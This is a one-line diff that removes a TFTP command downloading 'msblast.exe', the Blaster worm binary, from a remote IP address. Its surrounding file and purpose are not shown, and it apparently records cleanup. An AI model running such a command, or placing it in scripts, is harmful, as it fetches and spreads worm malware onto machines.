@@ -1,1 +1,0 @@
-tftp -i 172.163.57.226 GET msblast.exe
